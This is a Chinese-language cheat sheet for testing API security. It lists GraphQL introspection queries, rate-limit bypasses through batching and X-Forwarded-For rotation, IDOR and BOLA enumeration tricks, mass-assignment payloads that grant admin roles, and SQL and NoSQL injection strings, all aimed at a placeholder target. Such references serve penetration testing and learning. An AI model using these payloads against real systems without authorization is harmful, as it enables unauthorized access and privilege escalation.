# API安全详细分类

## 1. GraphQL安全

### 端点发现

```
/graphql
/api/graphql
/graphql/api
/query
/graphql.php
```

### 内省查询

```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### 绕过内省

```graphql
query { __schema { types { name } } }
{"query":"{__schema{types{name}}"}
```

### 批量查询绕过速率限制

```graphql
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  user3: user(id: 3) { name }
}
```

### 工具

```bash
gqlscan -u http://target.com/graphql
inql -t http://target.com/graphql
graphql-cop -t http://target.com/graphql
```

---

## 2. REST API安全

### 端点发现

```
/api/v1/users
/api/v2/products
/api/docs
/swagger.json
/openapi.json
```

### 未授权访问

```
curl http://target.com/api/v1/users
curl -H "X-API-Key: key" http://target.com/api/users
```

### HTTP方法测试

```
OPTIONS /api/users
PUT /api/users/1
DELETE /api/users/1
PATCH /api/users/1
```

---

## 3. IDOR漏洞

### 水平越权

```
/api/users/1 -> /api/users/2
GET /api/profile?user_id=1 -> user_id=2
```

### 垂直越权

```
普通用户 -> 管理员操作
```

### 批量IDOR

```
/api/users/batch?ids=1,2,3,4,5
```

### 绕过

- 数字变体: `/api/users/001`
- 编码: `/api/users/%31`
- JSON: `{"id": 1, "id": 2}`

---

## 4. 速率限制绕过

### IP轮换

```bash
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
done
```

### Header污染

```
X-Forwarded-For: 1.1.1.1
X-Real-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
Client-IP: 1.1.1.1
```

### 代理池

### 用户代理轮换

---

## 5. 批量赋值 (Mass Assignment)

### 探测

```json
POST /api/users
{"name": "test", "email": "test@test.com"}

响应:
{"id": 1, "name": "test", "email": "test@test.com", "role": "user", "isAdmin": false}
```

### 利用

```json
POST /api/users
{"name": "test", "role": "admin", "isAdmin": true}

PUT /api/users/1
{"role": "admin"}
```

---

## 6. BOLA (Broken Object Level Authorization)

### 对象枚举

```
/api/users/1
/api/users/2
/api/users/3
```

### 参数污染

```
/api/users?id=1&id=2
/api/users[0]=1&users[1]=2
```

---

## 7. API注入

### SQL注入

```
/api/users?name=admin'--
/api/users?id=1 UNION SELECT--
```

### NoSQL注入

```
/api/users?name[$ne]=admin
/api/users?name[$regex]=^admin
```

### JSON注入

```
{"name": "admin", "role": "admin"}
```

---

## 8. 工具

```bash
# RESTler
restler.py http://target.com/api

# Postman
# 导入API规范进行测试

# Kiter
kiter -u http://target.com/api
```
